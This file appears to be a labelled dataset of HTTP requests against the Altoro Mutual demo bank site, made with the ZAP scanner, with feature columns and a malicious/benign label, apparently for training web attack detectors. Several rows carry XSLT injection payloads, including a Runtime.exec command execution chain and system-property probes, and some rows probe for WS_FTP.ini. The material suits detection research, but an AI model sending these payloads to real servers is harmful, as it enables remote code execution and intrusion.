GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=system-property%28%27xsl%3Avendor%27%29%2F%3E,,2,0,0,1,3,0,0,1,0,93,0,1,1,"[2, 0, 0, 1, 3, 10, 0, 1, 0, 93, 3, 0]",1
GET,/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,83,0,1,1,"[2, 2, 0, 1, 1, 15, 0, 2, 0, 83, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%3C,,0,0,0,0,0,0,0,1,0,41,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 1, 1, 41, 3, 0]",0
GET,/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E&job=MortgageLendingAccountExecutive%3ASales,,2,2,0,1,1,0,0,2,0,125,0,1,1,"[2, 2, 0, 1, 1, 16, 0, 2, 1, 125, 3, 0]",1
GET,/static/index.jsp?content=%3C,,0,0,0,0,0,0,0,1,0,27,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 27, 3, 0]",0
GET,/search.jsp?query=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,72,0,2,1,"[2, 2, 0, 1, 1, 12, 0, 2, 0, 72, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,3,1,1,8,0,0,4,0,13,182,2,1,"[2, 3, 1, 1, 8, 17, 0, 4, 5, 13, 182, 0]",1
GET,/WS_FTP.ini,,0,0,0,0,0,0,0,0,0,11,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 3, 0]",0
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,,2,3,1,1,4,0,0,4,0,123,0,2,1,"[2, 3, 1, 1, 4, 20, 0, 4, 0, 123, 3, 0]",1
GET,/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,,2,14,0,3,7,0,0,8,0,264,0,5,1,"[2, 14, 0, 3, 7, 55, 0, 8, 3, 264, 3, 0]",1
GET,/survey_questions.jsp?step=%3C,,0,0,0,0,0,0,0,1,0,28,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 28, 3, 0]",0
GET,/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&job=MortgageLendingAccountExecutive%3ASales,,2,14,0,3,7,0,0,8,0,306,0,5,1,"[2, 14, 0, 3, 7, 56, 0, 8, 4, 306, 3, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,94,0,2,1,"[2, 2, 0, 1, 1, 12, 0, 2, 1, 94, 3, 0]",1
GET,/static/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,80,0,2,1,"[2, 2, 0, 1, 1, 12, 0, 2, 0, 80, 3, 0]",1
GET,/search.jsp?query=system-property%28%27xsl%3Avendor%27%29%2F%3E,,2,0,0,1,0,0,0,1,0,49,0,1,1,"[2, 0, 0, 1, 0, 7, 0, 1, 0, 49, 3, 0]",1
POST,/doLogin,uid=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&passw=ZAP&btnSubmit=Login,2,14,0,3,7,0,0,8,0,8,275,6,1,"[2, 14, 0, 3, 7, 55, 0, 8, 5, 8, 275, 0]",1
GET,/ws_ftp.ini,,0,0,0,0,0,0,0,0,0,11,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 3, 0]",0
POST,/doSubscribe,txtEmail=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&btnSubmit=Subscribe,2,14,0,3,7,0,0,8,0,12,274,5,1,"[2, 14, 0, 3, 7, 55, 0, 8, 4, 12, 274, 0]",1
